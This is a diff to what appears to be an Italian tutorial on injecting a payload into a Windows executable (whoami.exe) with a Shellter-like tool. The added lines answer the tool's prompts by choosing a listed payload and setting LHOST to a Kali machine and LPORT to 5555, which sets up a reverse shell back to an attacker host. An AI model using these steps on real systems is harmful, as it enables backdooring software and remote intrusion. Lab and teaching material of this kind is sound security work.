@@ -29,10 +29,8 @@ PE Target: whoami.exe
 SI APRIRà UNA SCHERMATA NERA MA DA TERMINALE TI CONTINUERà A CHIEDERE DI INSERIRE VALORI 
 ```bash
 Enable Stealth Mode? (Y/N/H): n
-Use a listed payload or custom? (L/C/H):
-
-
-
-
-
+Use a listed payload or custom? (L/C/H): L                                                                                                                                                         
+Select payload by index: 1   
+SET LHOST: <IP MACCHINA KALI>
+SET LPORT: 5555 
 ```
